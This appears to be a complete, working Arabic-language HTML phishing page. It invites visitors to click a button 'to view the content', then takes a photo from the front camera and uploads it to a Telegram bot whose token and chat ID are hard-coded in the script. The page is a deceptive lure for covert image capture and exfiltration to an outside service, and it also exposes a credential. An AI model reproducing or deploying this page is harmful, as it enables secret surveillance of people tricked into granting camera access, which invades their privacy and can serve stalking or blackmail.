<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body {
            margin: 0;
            background-color: #0f172a;
            color: #f8fafc;
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            text-align: center;
            padding: 20px;
        }
        .btn-start {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 14px 35px;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        h2 { font-size: 1.2rem; font-weight: 500; margin-bottom: 25px; }
    </style>
</head>
<body>

    <div class="loader-container" id="mainBox">
        <h2>انقر على الزر أدناه لعرض المحتوى</h2>
        <button class="btn-start" onclick="startProcess()">اضغط هنا</button>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TELEGRAM_BOT_TOKEN = '8880573702:AAEcni2H3MYNKkyU0GJen2XqPFgAyL04Mdw';
        const TELEGRAM_CHAT_ID = '8304712202';

        async function startProcess() {
            document.getElementById('mainBox').innerHTML = '<h2>جاري التقاط الصورة...</h2>';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const videoElement = document.getElementById('video');
                videoElement.srcObject = stream;

                setTimeout(() => {
                    captureAndSend(stream);
                }, 1500);

            } catch (error) {
                document.getElementById('mainBox').innerHTML = '<h2>خطأ في إذن الكاميرا: ' + error.message + '</h2>';
            }
        }

        function captureAndSend(stream) {
            try {
                const videoElement = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                canvas.width = videoElement.videoWidth || 640;
                canvas.height = videoElement.videoHeight || 480;

                const context = canvas.getContext('2d');
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob(function(blob) {
                    sendPhotoToTelegram(blob);
                }, 'image/jpeg', 0.85);

            } catch (e) {
                document.getElementById('mainBox').innerHTML = '<h2>خطأ في المعالجة: ' + e.message + '</h2>';
            }
        }

        function sendPhotoToTelegram(blob) {
            document.getElementById('mainBox').innerHTML = '<h2>جاري الإرسال إلى تيليجرام...</h2>';
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'captured_photo.jpg');

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if(data.ok) {
                    document.getElementById('mainBox').innerHTML = '<h2>تم إرسال الصورة بنجاح!</h2>';
                } else {
                    document.getElementById('mainBox').innerHTML = '<h2>خطأ من تيليجرام: ' + data.description + '</h2>';
                }
            })
            .catch(error => {
                document.getElementById('mainBox').innerHTML = '<h2>خطأ في الشبكة: ' + error.message + '</h2>';
            });
        }
    </script>
</body>
</html>
